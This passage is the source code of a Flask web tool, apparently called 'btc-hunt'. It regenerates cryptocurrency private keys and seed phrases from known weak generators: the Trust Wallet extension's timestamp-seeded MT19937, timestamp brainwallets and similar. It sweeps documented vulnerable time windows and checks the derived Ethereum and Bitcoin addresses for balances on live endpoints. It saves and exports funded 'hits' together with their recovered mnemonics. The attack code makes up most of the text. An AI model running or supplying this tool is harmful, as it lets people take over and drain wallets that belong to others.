               + (f" ({', '.join(extras)})" if extras else ""))
    return {"ok": ok, "msg": msg}

@app.route("/results")
def results_page():
    rows = _list_results()
    checks = _balance_checks()
    body = "<div class='card'><h2>Results</h2>"
    body += ("<p class='muted'>Hits are live-checked against Esplora as they "
             "are found. Zero-balance candidates are skipped by default and "
             "never reach this page; saved hits include balance fields. "
             "A Bloom hit is still only a candidate from a dated snapshot — "
             "even a funded hit needs manual verification with a block "
             "explorer. Use Check balances / Force re-check below to refresh "
             "stored balances. Set AUTO_VERIFY_HITS=0 for the old "
             "save-candidate-first behaviour.</p>")
    body += ("<p><a class='btn' href='/api/results/export'>Download all (JSONL)</a>"
             "<a class='btn' href='/api/results/export?attack=nonce'>"
             "Download nonce results (JSONL)</a>"
             "<a class='btn' href='/api/results/export?attack=eth'>"
             "Download Ethereum results (JSONL)</a></p>"
             "<p class='muted'>The page shows the newest 500 hits; "
             "the downloads contain all of them.</p>")
    body += ("<div class='card'><h2>Check balances</h2>"
             "<button class='btn' onclick=\"verifyBalances(false)\">"
             "Check balances</button>"
             "<button class='btn' onclick=\"verifyBalances(true)\">"
             "Force re-check</button>"
             "<button class='btn danger' onclick=\"stop('verify')\">Stop</button>"
             "<p class='muted'>New hits are already checked live. This re-checks "
             f"saved hit addresses against {html.escape(_esplora_host(_ESPLORA_BASES[0]))}"
             + (f" (failing over to "
                f"{html.escape(', '.join(_esplora_host(b) for b in _ESPLORA_BASES[1:]))})"
                if len(_ESPLORA_BASES) > 1 else "")
             + ", paced by ESPLORA_MIN_INTERVAL and cached per process. On "
               "HTTP 429 that endpoint cools down, the next one is used, and "
               "the affected addresses are retried in up to "
             f"{VERIFY_RETRY_PASSES + 1} passes instead of being recorded as "
               "errors. Force re-check clears that cache. "
             f"Max {VERIFY_MAX_ADDRESSES:,} unique addresses per run.</p>"
             f"<p class='muted'>Endpoints now: {html.escape(_esplora_status())}</p>"
             "<div class='bar'><div id='bar' style='width:0%'></div></div>"
             "<p id='detail' class='muted'></p><pre id='log'></pre></div>")
    body += ("<div class='card'><h2>Check ETH balances</h2>"
             "<button class='btn' onclick=\"post('/api/eth/verify',{})\">"
             "Check ETH balances</button>"
             "<button class='btn danger' onclick=\"stop('eth_verify')\">"
             "Stop</button>"
             f"<p class='muted'>Re-checks every saved 0x address over JSON-RPC "
             f"in batches of {ETH_RPC_BATCH} addresses, with per-endpoint 429 "
             "failover and retry passes. Rows store gwei + the wei remainder "
             "and the nonce, so 0 ETH with nonce 0 reads as never used.</p>"
             "<div class='bar'><div id='barEth' style='width:0%'></div></div>"
             "<p id='detailEth' class='muted'></p><pre id='logEth'></pre></div>")
    if not rows:
        body += "<p class='muted'>no hits yet</p>"
    funded = never_funded = unchecked = 0
    for r in rows:
        payload = r["payload"]
        addrs = []
        for key in ("address", "recovered_addr"):
            a = payload.get(key)
            if isinstance(a, str) and a and a not in addrs:
                addrs.append(a)
        badges = []
        for a in addrs:
            v = checks.get(a)
            if v and not v["error"]:
                if v["sats"] + v["mempool_sats"] > 0:
                    funded += 1
                elif v["tx_count"] == 0:
                    never_funded += 1
            else:
                unchecked += 1
            badges.append("<p>" + html.escape(a) + " — "
                          + _balance_badge(a, checks) + "</p>")
        # Hit payloads can contain user-supplied passphrases: escape before
        # inserting into HTML, otherwise a stored XSS is possible.
        body += (f"<div class='card'><p class='hit'>[{html.escape(str(r['attack']))}] "
                 f"{html.escape(str(r['ts']))}</p>"
                 + "".join(badges)
                 + f"<pre>{html.escape(json.dumps(payload, indent=2))}</pre></div>")
    if rows:
        body += (f"<p class='muted'>Summary: {funded:,} with a balance, "
                 f"{never_funded:,} never funded (likely false positives), "
                 f"{unchecked:,} not checked yet.</p>")
    body += "</div>"
    body += ("<script>\n"
             "function verifyBalances(force){ post('/api/verify',{force:!!force}); }\n"
             "watch('verify');\n"
             "watch('eth_verify','Eth');\n"
             "</script>")
    return page(body)

@app.route("/api/verify", methods=["POST"])
def api_verify():
    """Start an async balance check of all saved hits."""
    j = request.get_json(silent=True) or {}
    force = bool(j.get("force"))
    if force:
        _esplora_cache_clear()
    ok, msg = _start_job("verify", verify_result_balances, force)
    return {"ok": ok, "msg": msg}


@app.route("/api/esplora")
def api_esplora():
    """Live Esplora endpoint health: which base is cooling down, and for how long."""
    with _RATE_LOCK:
        interval = _RATE_INTERVAL[0]
        cached = len(_ESPLORA_CACHE)
    return {"bases": [{"url": b, "host": _esplora_host(b)} for b in _ESPLORA_BASES],
            "status": _esplora_status(),
            "interval_secs": round(interval, 3),
            "min_interval_secs": ESPLORA_MIN_INTERVAL,
            "pace_max_secs": ESPLORA_PACE_MAX_SECS,
            "max_backoff_secs": ESPLORA_MAX_BACKOFF_SECS,
            "max_retries": ESPLORA_MAX_RETRIES,
            "cached_responses": cached,
            "user_agent": _esplora_headers().get("User-Agent", ""),
            "verify_retry_passes": VERIFY_RETRY_PASSES}

@app.route("/api/results/export")
def api_results_export():
    """All hits as newline-delimited JSON (the page shows only 500)."""
    attack = (request.args.get("attack") or "").strip()
    q = "SELECT attack,payload,ts FROM results"
    args = ()
    if attack == "eth":
        # Ethereum hits are bucketed per recipe (eth_tw_bip39_s, eth_weakkey…)
        q += " WHERE attack LIKE 'eth%'"
    elif attack:
        q += " WHERE attack = ?"
        args = (attack,)
    q += " ORDER BY id ASC"
    with _db() as c:
        rows = list(c.execute(q, args))
    checks = _balance_checks()
    lines = []
    for a, p, ts in rows:
        try:
            item = json.loads(p)
        except Exception:
            item = {"payload_raw": p}
        item["attack"] = a
        item["saved_at"] = ts
        addr = item.get("address") or item.get("recovered_addr")
        v = checks.get(addr) if isinstance(addr, str) else None
        if v:
            sats = v["sats"] + v["mempool_sats"]
            item["balance_sats"] = sats
            item["balance_tx_count"] = v["tx_count"]
            item["balance_checked_at"] = v["checked_at"]
            item["balance_error"] = v["error"]
            item["balance_verdict"] = (
                "check_failed" if v["error"] else
                "funded_verify_manually" if sats > 0 else
                "never_funded_likely_false_positive" if v["tx_count"] == 0 else
                "empty_or_spent")
        lines.append(json.dumps(item))
    slug = re.sub(r"[^A-Za-z0-9_-]", "", attack) or "all"
    filename = f"btc-hunt-{slug}-results.jsonl"
    return Response("\n".join(lines) + ("\n" if lines else ""),
                    mimetype="application/x-ndjson",
                    headers={"Content-Disposition": f'attachment; filename="{filename}"',
                             "Cache-Control": "no-store, max-age=0"})

@app.route("/api/job/<name>")
def api_job_status(name):
    """Short, cache-free JSON snapshot. Clients poll with ?since=<log_total>.

    Replaces the old text/event-stream generator, which never terminated when
    idle and therefore held one Gunicorn thread open per browser tab forever.
    """
    with _JOBS_LOCK:
        job = _JOBS.get(name)
        if job is None:
            payload = {"exists": False, "alive": False, "progress": 0.0,
                       "detail": "not started", "error": "", "log": [],
                       "log_len": 0}
        else:
            total = job["log_total"]
            try:
                since = int(request.args.get("since", 0) or 0)
            except ValueError:
                since = 0
            since = max(0, min(since, total))
            n_new = min(total - since, len(job["log"]))
            new = job["log"][-n_new:] if n_new > 0 else []
            payload = {"exists": True, "alive": job["alive"],
                       "progress": job["progress"], "detail": job["detail"],
                       "error": job["error"], "log": new, "log_len": total,
                       "started": job["started"],
                       "partial": bool(job.get("partial", False))}
    return Response(json.dumps(payload), mimetype="application/json",
                    headers={"Cache-Control": "no-store, max-age=0"})


@app.route("/api/log/<name>")
def api_log_status(name):
    return api_job_status(name)


@app.route("/api/jobs")
def api_jobs():
    """One no-store snapshot of every job slot; used by the home page."""
    with _JOBS_LOCK:
        jobs = {}
        for name in JOB_NAMES:
            j = _JOBS.get(name)
            jobs[name] = {"alive": bool(j and j["alive"]),
                          "detail": (j or {}).get("detail", "not started"),
                          "progress": (j or {}).get("progress", 0.0),
                          "error": (j or {}).get("error", "")}
    payload = {"ok": True, "jobs": jobs, "busy": BUSY_FILE.exists(),
               "pid": os.getpid()}
    return Response(json.dumps(payload), mimetype="application/json",
                    headers={"Cache-Control": "no-store, max-age=0"})


@app.route("/api/jobs/kill-all", methods=["POST"])
def api_kill_all():
    """Stop all jobs, clear the deploy marker, optionally replace the worker."""
    j = request.get_json(silent=True)
    if not isinstance(j, dict):
        j = {}
    restart = bool(j.get("restart", False))
    killed = _kill_all_jobs("killed from dashboard")
    msg = (f"stopped {len(killed)} job(s); cleared deploy marker"
           if killed else "no jobs were running; cleared deploy marker")
    restart_ok = False
    if restart:
        if not (APP_USER and APP_PASSWORD):
            msg += " — worker restart requires Basic auth to be configured"
        elif not _can_restart_worker():
            msg += " — worker restart unavailable in this process"
        else:
            _schedule_worker_restart()
            restart_ok = True
            msg += " — restarting worker"
    payload = {"ok": True, "msg": msg, "killed": killed,
               "restarting": restart_ok}
    return Response(json.dumps(payload), mimetype="application/json",
                    headers={"Cache-Control": "no-store, max-age=0"})


@app.route("/api/stop/<name>", methods=["POST"])
def api_stop(name):
    with _JOBS_LOCK:
        job = _JOBS.get(name)
        if not job or not job["alive"]:
            return {"ok": False, "msg": "no running job"}
        job["stop"] = True
        job["detail"] = "stopping…"
    return {"ok": True, "msg": "stop requested"}


# ════════════════════════════════════════════════════════════════════
# ENTRY
# ════════════════════════════════════════════════════════════════════
def _shard_range(start, end, idx, n):
    """Split [start,end] into n contiguous shards; return shard idx (0-based)."""
    total = end - start + 1
    per = total // n
    s = start + idx * per
    e = end if idx == n - 1 else s + per - 1
    return s, e



# ════════════════════════════════════════════════════════════════════
# ATTACK 4 — ETHEREUM (timestamp sweeps + weak keys, live RPC balances)
# ════════════════════════════════════════════════════════════════════
# Same curve as Bitcoin (secp256k1) — so the EC backend from the Randstorm work
# is reused as-is — but a different address hash and, crucially, no local
# dataset: there is no bloom filter of funded Ethereum addresses to probe.
# The scan is therefore inverted. Derive candidates cheaply, then ask the chain
# about a whole BATCH of them per HTTP request (ETH_RPC_BATCH addresses, two
# calls each: eth_getBalance + eth_getTransactionCount).
#
# A TIMESTAMP IS A SEED, NEVER A KEY. Exactly as with Randstorm, each recipe
# below reproduces a specific broken generator and declares the unit (seconds
# or milliseconds) that generator was fed. Sweeping `privkey = 1405987200000`
# directly is the `raw` recipe and is included only because people really did
# it — it is not how any of these wallets were made.

# ── Keccak-256 ──────────────────────────────────────────────────────────
# Ethereum uses the ORIGINAL Keccak padding (domain byte 0x01), not NIST
# SHA3-256 (0x06), so hashlib's sha3_256 is the wrong function. Verified
# against keccak256("") = c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7b
# fad8045d85a470 and keccak256("abc")/keccak256("testing").
_M64 = 0xFFFFFFFFFFFFFFFF


def _rol64(a, n):
    n %= 64
    return a if n == 0 else ((a << n) | (a >> (64 - n))) & _M64


def _keccak_f1600(A):
    # The round-constant LFSR must persist across all 24 rounds; resetting it
    # per round silently produces a different (wrong) hash.
    R = 1
    for _ in range(24):
        C = [A[x][0] ^ A[x][1] ^ A[x][2] ^ A[x][3] ^ A[x][4] for x in range(5)]
        D = [C[(x + 4) % 5] ^ _rol64(C[(x + 1) % 5], 1) for x in range(5)]
        for x in range(5):
            for y in range(5):
                A[x][y] ^= D[x]
        x, y = 1, 0
        cur = A[x][y]
        for t in range(24):
            x, y = y, (2 * x + 3 * y) % 5
            cur, A[x][y] = A[x][y], _rol64(cur, (t + 1) * (t + 2) // 2)
        for y in range(5):
            T = [A[x][y] for x in range(5)]
            for x in range(5):
                A[x][y] = T[x] ^ ((~T[(x + 1) % 5]) & T[(x + 2) % 5])
        for j in range(7):
            R = ((R << 1) ^ ((R >> 7) * 0x71)) % 256
            if R & 2:
                A[0][0] ^= 1 << ((1 << j) - 1)
    return A


def _keccak256_py(data):
    """Pure-Python Keccak-256 (~400 us per 64-byte hash)."""
    rate = 136                                   # 1088-bit rate
    st = [[0] * 5 for _ in range(5)]
    buf = bytearray(data) + b"\x01"
    while len(buf) % rate:
        buf.append(0)
    buf[-1] |= 0x80
    for off in range(0, len(buf), rate):
        blk = buf[off:off + rate]
        for i in range(rate // 8):
            st[i % 5][i // 5] ^= struct.unpack_from("<Q", blk, 8 * i)[0]
        st = _keccak_f1600(st)
    out = b"".join(struct.pack("<Q", st[j][i])
                   for i in range(5) for j in range(5))
    return out[:32]


try:                                   # optional native acceleration (~117x)
    from Crypto.Hash import keccak as _pycryptodome_keccak
    import Crypto as _pycryptodome

    def _keccak256_native(data):
        h = _pycryptodome_keccak.new(digest_bits=256)
        h.update(data)
        return h.digest()
except Exception:
    _pycryptodome_keccak = None
    _pycryptodome = None
    _keccak256_native = None

keccak256 = _keccak256_native or _keccak256_py
ETH_HASH_BACKEND = (
    "pycryptodome %s" % getattr(_pycryptodome, "__version__", "?")
    if _keccak256_native else "python keccak-f1600 (~400 us/hash)")


# ── Mersenne Twister (MT19937) ───────────────────────────────────────────
class _MT19937:
    """Reference init_genrand MT19937.

    Verified: seed 5489 yields 3499211612, 581869302, 3890346734, 3586334585,
    545404204 — the published test vector. This is the generator shape behind
    the Trust Wallet browser-extension bug, where it was seeded with a Unix
    timestamp in SECONDS instead of a CSPRNG.
    """

    def __init__(self, seed):
        mt = [0] * 624
        mt[0] = seed & 0xFFFFFFFF
        for i in range(1, 624):
            mt[i] = (1812433253 * (mt[i - 1] ^ (mt[i - 1] >> 30)) + i) & 0xFFFFFFFF
        self.mt = mt
        self.idx = 624

    def _twist(self):
        mt = self.mt
        for i in range(624):
            y = (mt[i] & 0x80000000) + (mt[(i + 1) % 624] & 0x7FFFFFFF)
            mt[i] = mt[(i + 397) % 624] ^ (y >> 1)
            if y & 1:
                mt[i] ^= 2567483615
        self.idx = 0

    def int32(self):
        if self.idx >= 624:
            self._twist()
        y = self.mt[self.idx]
        self.idx += 1
        y ^= y >> 11
        y ^= (y << 7) & 2636928640
        y ^= (y << 15) & 4022730752
        y ^= y >> 18
        return y & 0xFFFFFFFF


# ── BIP-39 / BIP-32 ─────────────────────────────────────────────────────
_BIP39_WORDS = None
_BIP39_LOCK = threading.Lock()
_ETH_PATH = (0x80000000 + 44, 0x80000000 + 60, 0x80000000, 0, 0)


def _bip39_words():
    """The 2048-word BIP-39 English list, loaded once (vendored data file)."""
    global _BIP39_WORDS
    with _BIP39_LOCK:
        if _BIP39_WORDS is None:
            words = BIP39_WORDLIST_PATH.read_text(encoding="utf-8").split()
            if len(words) != 2048:
                raise RuntimeError(
                    "BIP-39 wordlist must hold 2048 words, found %d in %s"
                    % (len(words), BIP39_WORDLIST_PATH))
            _BIP39_WORDS = words
        return _BIP39_WORDS


def bip39_mnemonic(entropy):
    """16 bytes of entropy -> the 12-word sentence (4-bit SHA-256 checksum).

    Verified: 16 zero bytes -> "abandon abandon ... about".
    """
    words = _bip39_words()
    bits = "".join(format(x, "08b") for x in entropy)
    bits += "".join(format(x, "08b")
                    for x in hashlib.sha256(entropy).digest())[:len(entropy) // 4]
    return " ".join(words[int(bits[i:i + 11], 2)] for i in range(0, len(bits), 11))


def bip39_seed(mnemonic, passphrase=""):
    """PBKDF2-HMAC-SHA512, 2048 rounds, salt "mnemonic"+passphrase (NFKD).

    Verified against the BIP-39 "TREZOR" vector.
    """
    pw = unicodedata.normalize("NFKD", mnemonic).encode("utf-8")
    salt = unicodedata.normalize("NFKD", "mnemonic" + passphrase).encode("utf-8")
    return hashlib.pbkdf2_hmac("sha512", pw, salt, 2048, 64)


def bip32_master(seed):
    I = hmac.new(b"Bitcoin seed", seed, hashlib.sha512).digest()
    return int.from_bytes(I[:32], "big"), I[32:]


def _ser_pub(k):
    x, y = _ec_point(k)
    return b"\x04" + x.to_bytes(32, "big") + y.to_bytes(32, "big")


def bip32_ckd_priv(k, cc, index):
    """One BIP-32 private child derivation (hardened when index >= 2**31).

    Verified against BIP-32 test vector 1 (m and m/0H).
    """
    if index >= 0x80000000:
        data = b"\x00" + k.to_bytes(32, "big") + struct.pack(">I", index)
    else:
        data = _ser_pub(k) + struct.pack(">I", index)
    I = hmac.new(cc, data, hashlib.sha512).digest()
    il = int.from_bytes(I[:32], "big")
    child = (il + k) % N
    if il >= N or child == 0:
        raise ValueError("invalid BIP-32 child key")
    return child, I[32:]


def eth_account_from_seed(seed, path=_ETH_PATH):
    """The m/44'/60'/0'/0/0 private key of a BIP-39 seed."""
    k, cc = bip32_master(seed)
    for index in path:
        k, cc = bip32_ckd_priv(k, cc, index)
    return k


# ── Ethereum addresses ──────────────────────────────────────────────────
_ETH_ADDR_RE = re.compile(r"^0x[0-9a-fA-F]{40}$")


def eth_address_bytes(privkey):
    """keccak256(uncompressed pubkey without the 0x04 prefix)[-20:]."""
    k = privkey % N
    if k == 0:
        return None
    pt = _ec_point(k)
    if pt is None:
        return None
    return keccak256(pt[0].to_bytes(32, "big") + pt[1].to_bytes(32, "big"))[-20:]


def eth_address(privkey):
    """EIP-55 mixed-case checksummed address (verified for keys 1, 2, 3)."""
    h = eth_address_bytes(privkey)
    if h is None:
        return None
    hx = h.hex()
    up = keccak256(hx.encode("ascii")).hex()
    return "0x" + "".join(c.upper() if int(up[i], 16) >= 8 else c
                          for i, c in enumerate(hx))


# ── Recipes: which broken generator a timestamp is fed into ──────────────
def _r_raw(value, unit):
    k = value % N
    return [(k, {"recipe_input": value})] if k else []


def _r_sha256_dec(value, unit):
    k = int.from_bytes(hashlib.sha256(str(value).encode("ascii")).digest(),
                       "big") % N
    return [(k, {"recipe_input": value})] if k else []


def _r_sha256_be8(value, unit):
    k = int.from_bytes(hashlib.sha256(value.to_bytes(8, "big")).digest(),
                       "big") % N
    return [(k, {"recipe_input": value})] if k else []


def _r_keccak_dec(value, unit):
    k = int.from_bytes(keccak256(str(value).encode("ascii")), "big") % N
    return [(k, {"recipe_input": value})] if k else []


def _r_mt19937_s(value, unit):
    seed32 = value & 0xFFFFFFFF
    mt = _MT19937(seed32)
    raw = b"".join(struct.pack(">I", mt.int32()) for _ in range(8))
    k = int.from_bytes(raw, "big") % N
    return [(k, {"mt_seed": seed32})] if k else []


def _r_tw_bip39_s(value, unit):
    """Trust Wallet Extension v2.68 class: MT19937 seeded with Unix SECONDS,
    first four 32-bit outputs used as 16 bytes of BIP-39 entropy, then
    m/44'/60'/0'/0/0.

    The MT/BIP-39/BIP-32 layers each match their published test vectors, but
    the exact order in which the vulnerable library consumed MT output is not
    publicly documented, so treat a miss as "this recipe shape did not match",
    not as proof that a wallet in the window is safe.
    """
    seed32 = value & 0xFFFFFFFF
    mt = _MT19937(seed32)
    entropy = b"".join(struct.pack(">I", mt.int32()) for _ in range(4))
    mnemonic = bip39_mnemonic(entropy)
    k = eth_account_from_seed(bip39_seed(mnemonic))
    return [(k, {"mt_seed": seed32, "entropy": entropy.hex(),
                 "mnemonic": mnemonic, "path": "m/44'/60'/0'/0/0"})] if k else []


ETH_RECIPES = {
    "tw_bip39_s": {
        "label": "Trust Wallet MT19937 → BIP-39 → m/44'/60'/0'/0/0",
        "units": ("s",), "default": True, "fn": _r_tw_bip39_s,
        "note": "MT19937 seeded with the Unix timestamp in SECONDS, first 4 "
                "outputs used as 12-word mnemonic entropy. This is the shape "
                "of the Trust Wallet browser-extension bug (v2.68, wallets "
                "created 2022-11-24 → 2022-12-22). ~2.7 ms per candidate "
                "(PBKDF2-2048 dominates), so the 2,505,600-second window "
                "takes ~2 h."},
    "sha256_dec": {
        "label": "sha256(decimal timestamp)",
        "units": ("ms", "s"), "default": True, "fn": _r_sha256_dec,
        "note": "The classic timestamp brainwallet: privkey = "
                "sha256(str(timestamp)). Common in 2015-era scripts and "
                "tutorial code."},
    "keccak_dec": {
        "label": "keccak256(decimal timestamp)",
        "units": ("ms", "s"), "default": False, "fn": _r_keccak_dec,
        "note": "The Ethereum-native variant of the same brainwallet idea."},
    "sha256_be8": {
        "label": "sha256(8-byte big-endian timestamp)",
        "units": ("ms", "s"), "default": False, "fn": _r_sha256_be8,
        "note": "Binary instead of decimal input; what a program that hashed "
                "the raw integer would produce."},
    "mt19937_s": {
        "label": "MT19937(seconds) → first 32 bytes as the key",
        "units": ("s",), "default": False, "fn": _r_mt19937_s,
        "note": "Raw Mersenne-Twister output used directly as a private key "
                "(no BIP-39 layer). Much faster than the mnemonic recipe."},
    "raw": {
        "label": "the timestamp itself as the key",
        "units": ("ms", "s"), "default": False, "fn": _r_raw,
        "note": "privkey = timestamp. Included because early users really did "
                "this, not because any library generated keys this way."},
}

# Documented windows, for the preset buttons. Values are exact UTC epochs.
# Fixed, documented windows. `scannable: False` means the window is listed for
# completeness but a private-key timestamp sweep CANNOT recover it — the page and
# the log say so every time, because the alternative is letting someone burn a
# week of CPU on a window that was never keyed from a clock.
#
# Two corrections to the widely copy-pasted era table, kept here so the numbers
# in this file are the ones actually used:
#   * Era 3's end is 1577836800000 (2020-01-01 UTC). The circulating value
#     15778368000000 has one digit too many and lands in the year 2471.
#   * The CryptoJS bug is CVE-2023-46233 (WordArray.random falling back to
#     Math.random, fixed in 4.2.0). "CVE-2026-71851" does not exist.
ETH_ERAS = [
    {"id": "presale", "era": "Era 1", "unit": "ms",
     "start": 1405987200000, "end": 1409702399000,
     "label": "The 2014 presale / ICO genesis",
     "window": "2014-07-22 → 2014-09-02 (42 days)",
     "recipes": ["sha256_dec", "keccak_dec", "raw"],
     "default": False, "scannable": False,
     "warn": "Will NOT recover a presale wallet",
     "note": "Presale private keys came from a real CSPRNG. The documented "
             "weakness is in the ENCRYPTED KEYSTORE (weak password, IV reuse), "
             "so a browser PRNG that collapsed to a millisecond timestamp "
             "yields the keystore password/IV — not a private key. Listed so "
             "the window is not mistaken for a scannable one; sweep it only to "
             "confirm that it produces nothing."},
    {"id": "frontier", "era": "Era 2", "unit": "ms",
     "start": 1438214400000, "end": 1451606399000,
     "label": "The 2015 Frontier era",
     "window": "2015-07-30 → 2015-12-31",
     "recipes": ["sha256_dec", "keccak_dec", "sha256_be8", "raw"],
     "default": True, "scannable": True, "warn": "",
     "note": "Weak key generation and early miner/script wallets seeded from "
             "low-entropy sources, including the clock. 13.4 billion ms "
             "timestamps: a batch run takes a slice (ETH_ERA_STEPS) from the "
             "start or from an offset. Note that the keys actually drained in "
             "2015-2016 were mostly SEQUENTIAL and dictionary keys — that is "
             "the weak-key card, not this one."},
    {"id": "cryptojs", "era": "Era 3", "unit": "ms",
     "start": 1514764800000, "end": 1577836800000,
     "label": "The CryptoJS Math.random era",
     "window": "2018-01-01 → 2020-01-01",
     "recipes": ["sha256_dec", "keccak_dec", "mt19937_s"],
     "default": True, "scannable": True,
     "warn": "Timestamp recipes only find clock-seeded keys",
     "note": "CVE-2023-46233: CryptoJS < 4.2.0 made WordArray.random fall back "
             "to Math.random, so seed phrases came from the browser PRNG. "
             "Recovering those wallets means reconstructing the PRNG STATE "
             "(V8 xorshift128+, or MWC1616 in older engines), which is a "
             "different attack — a timestamp sweep only finds wallets whose "
             "entropy was ALSO the clock. The often-quoted id "
             "\"CVE-2026-71851\" does not exist, and the often-quoted end "
             "15778368000000 is one digit too many (year 2471)."},
    {"id": "tw", "era": "Era 4", "unit": "s",
     "start": 1669248000, "end": 1671753599,
     "label": "Trust Wallet Extension v2.68",
     "window": "2022-11-24 → 2022-12-22",
     "recipes": ["tw_bip39_s", "mt19937_s"],
     "default": True, "scannable": True, "warn": "",
     "note": "The one documented timestamp-seeded Ethereum bug: MT19937 seeded "
             "with Unix SECONDS instead of a CSPRNG. 2,505,600 candidate seeds "
             "— the only window here that fits in a single run. The exact order "
             "in which the vulnerable library consumed MT output is not "
             "publicly documented, so a miss means \"this recipe shape did not "
             "match\", not \"the window is safe\"."},
]
ETH_PRESETS = ETH_ERAS          # older name, same table

_range_chunks = _randstorm_chunks        # generic inclusive chunker


# ── JSON-RPC client: batching, parking, failover, durable retry queue ────
# Three failure modes are kept strictly apart, because they need different
# responses:
#   throttle (429/5xx)  → park briefly, fail over, wait, retry the SAME batch
#   refusal  (401/403)  → park for ETH_DEAD_COOL_SECS; if every endpoint
#                         refuses, stop the run instead of deriving candidates
#                         that can never be checked
#   bad batch (400/413, or a single object instead of an array)
#                       → remember it, halve the batch size, retry as singles
# Anything that still cannot be checked is appended to eth_pending.jsonl rather
# than dropped, so the derivation work is not lost.
_ETH_HEADERS = {"Content-Type": "application/json", "Accept": "application/json"}
_ETH_BATCH_OK = {}      # base -> bool: accepts a JSON array (batch) request
_ETH_BASE_ERR = {}      # base -> last failure reason, for aggregated logging
_ETH_DEAD = {}          # base -> monotonic deadline of a 401/403 refusal
_ETH_ACTIVE = []        # endpoints that answered the pre-flight probe
_ETH_LOCK = threading.Lock()
_ETH_BATCH_SIZE = [ETH_RPC_BATCH]      # adaptive; shrinks when a batch is refused
_ETH_BATCH_STREAK = [0]
_ETH_PENDING_N = [-1]                  # cached line count of the queue file


class _EthNoEndpoint(RuntimeError):
    """Every configured endpoint refused us (401/403).

    Deliberately NOT an _EsploraRateLimited: a throttle means "wait and retry",
    a refusal means "this endpoint will never answer this host", so continuing a
    multi-hour sweep would only pile up unchecked candidates.
    """


def _eth_headers():
    h = dict(_ETH_HEADERS)
    h["User-Agent"] = (ETH_RPC_USER_AGENT
                       or _esplora_headers().get("User-Agent", "btc-hunt"))
    return h


def _eth_host(base):
    """Host plus path: https://1rpc.io/eth must not display as plain 1rpc.io."""
    return base.split("//")[-1]


def _eth_bases():
    """Endpoints in play: the pre-flight survivors, or all of them."""
    return _ETH_ACTIVE or _ETH_RPC_BASES


def _eth_park(base, seconds, reason, dead=False):
    """Cool ONE endpoint down, without raising the global pacing floor."""
    now = time.monotonic()
    with _RATE_LOCK:
        _BASE_COOL[base] = max(_BASE_COOL.get(base, 0.0), now + seconds)
        _BASE_FAILS[base] = _BASE_FAILS.get(base, 0) + 1
    with _ETH_LOCK:
        _ETH_BASE_ERR[base] = reason
        if dead:
            _ETH_DEAD[base] = now + seconds
        else:
            _ETH_DEAD.pop(base, None)


def _eth_unpark(base):
    with _RATE_LOCK:
        _BASE_COOL.pop(base, None)
        _BASE_FAILS.pop(base, None)
    with _ETH_LOCK:
        _ETH_BASE_ERR.pop(base, None)
        _ETH_DEAD.pop(base, None)


def _eth_ready():
    now = time.monotonic()
    with _RATE_LOCK:
        cool = dict(_BASE_COOL)
    return [b for b in _eth_bases() if cool.get(b, 0.0) <= now]


def _eth_all_dead():
    """True when every endpoint in play refused us outright."""
    now = time.monotonic()
    bases = _eth_bases()
    with _ETH_LOCK:
        dead = {b: t for b, t in _ETH_DEAD.items() if t > now}
    return bool(bases) and all(b in dead for b in bases)


def _eth_status():
    """One-line per-endpoint state: ok, cooling, or REFUSING (with the reason)."""
    now = time.monotonic()
    with _RATE_LOCK:
        cool = dict(_BASE_COOL)
    with _ETH_LOCK:
        dead = dict(_ETH_DEAD)
        errs = dict(_ETH_BASE_ERR)
    parts = []
    for b in _eth_bases():
        host = _eth_host(b)
        left = cool.get(b, 0.0) - now
        if dead.get(b, 0.0) > now:
            parts.append("%s: REFUSING (%s)" % (host, errs.get(b, "403")))
        elif left > 0:
            parts.append("%s: cooling %.0fs" % (host, left))
        elif b in errs:
            parts.append("%s: ok (last error: %s)" % (host, errs[b]))
        else:
            parts.append("%s: ok" % host)
    return "  ".join(parts) or "no endpoints configured"


def _eth_batch_size():
    with _ETH_LOCK:
        return max(1, _ETH_BATCH_SIZE[0])


def _eth_shrink_batch():
    """Halve the batch size after an endpoint refused one. Returns (old, new)."""
    with _ETH_LOCK:
        old = _ETH_BATCH_SIZE[0]
        new = max(1, old // 2)
        _ETH_BATCH_SIZE[0] = new
        _ETH_BATCH_STREAK[0] = 0
        return old, new


def _eth_batch_success():
    """Grow the batch back toward ETH_RPC_BATCH after 20 clean requests."""
    with _ETH_LOCK:
        _ETH_BATCH_STREAK[0] += 1
        if _ETH_BATCH_STREAK[0] >= 20 and _ETH_BATCH_SIZE[0] < ETH_RPC_BATCH:
            _ETH_BATCH_SIZE[0] = min(ETH_RPC_BATCH,
                                     max(1, int(_ETH_BATCH_SIZE[0] * 1.5)))
            _ETH_BATCH_STREAK[0] = 0


def _eth_post_once(base, calls, batch, should_stop=None):
    """One POST to one endpoint. Parks it on failure.

    Returns (kind, data, text) with kind in ok | refused_batch | dead |
    throttle | reject | error.
    """
    _esplora_pace(should_stop)
    try:
        r = requests.post(base, json=(calls if batch else calls[0]),
                          timeout=ETH_RPC_TIMEOUT, headers=_eth_headers())
    except Exception as e:
        text = "%s: %s" % (type(e).__name__, str(e)[:100])
        _eth_park(base, ETH_ERROR_COOL_SECS, text)
        return "error", None, text
    body = (r.text or "").strip().replace("\n", " ")[:80]
    if r.status_code in (401, 403):
        text = "HTTP %d %s" % (r.status_code, body)
        _eth_park(base, ETH_DEAD_COOL_SECS, text, dead=True)
        return "dead", None, text
    if r.status_code == 429 or r.status_code >= 500:
        cool = _esplora_throttled(base, r)
        text = "HTTP %d — cooling %.0fs" % (r.status_code, cool)
        with _ETH_LOCK:
            _ETH_BASE_ERR[base] = text
        return "throttle", None, text
    if r.status_code >= 400:
        text = "HTTP %d %s" % (r.status_code, body)
        _eth_park(base, ETH_ERROR_COOL_SECS, text)
        return "reject", None, text
    try:
        data = r.json()
    except Exception as e:
        text = "non-JSON reply (%s)" % str(e)[:60]
        _eth_park(base, ETH_ERROR_COOL_SECS, text)
        return "error", None, text
    if batch and not isinstance(data, list):
        text = "answered a batch with a single object"
        _eth_park(base, 0.0, text)
        return "refused_batch", None, text
    _esplora_rate_ok(base)
    with _ETH_LOCK:
        _ETH_DEAD.pop(base, None)
        _ETH_BASE_ERR.pop(base, None)
    return "ok", data, ""


def _eth_call_batch(calls, should_stop=None):
    """POST JSON-RPC `calls`; return (results_aligned_with_input, base_used).

    Every usable endpoint gets one attempt per round, for up to ETH_RPC_ROUNDS
    rounds. When nothing is left standing the client WAITS for a cooldown to
    expire and tries again — it does not drop the batch. Only a blanket refusal
